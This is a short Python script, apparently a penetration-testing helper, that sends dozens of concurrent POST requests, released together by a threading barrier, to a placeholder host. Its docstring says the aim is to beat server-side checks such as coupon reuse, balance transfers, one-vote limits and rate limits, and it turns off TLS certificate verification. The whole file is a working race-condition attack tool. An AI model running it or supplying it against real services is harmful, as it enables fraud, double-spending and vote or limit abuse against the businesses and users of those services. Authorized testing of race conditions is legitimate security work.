#!/usr/bin/env python3
"""Race conditions: fire many requests as close to simultaneously as possible
to beat a server-side check (coupon reuse, balance transfer, one-vote limits,
rate limits). Uses a barrier so all threads release together."""

import threading
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"


def race_post(path: str, data: dict | None = None, json_body: dict | None = None,
              cookies: dict | None = None, threads: int = 30) -> list:
    """Send 'threads' concurrent POSTs, all released at the same instant via a
    barrier. Returns a list of (status_code, body_prefix) tuples to inspect for
    the request(s) that slipped through."""
    results = []
    lock = threading.Lock()
    barrier = threading.Barrier(threads)

    def worker():
        barrier.wait()
        try:
            r = requests.post(f"{BASE_URL}{path}", data=data, json=json_body,
                              cookies=cookies, verify=False, timeout=15)
            with lock:
                results.append((r.status_code, r.text[:120]))
        except Exception as e:
            with lock:
                results.append(("ERR", str(e)))

    pool = [threading.Thread(target=worker) for _ in range(threads)]
    for t in pool:
        t.start()
    for t in pool:
        t.join()

    for status, body in results:
        print(f"[{status}] {body}")
    return results


if __name__ == "__main__":
    pass
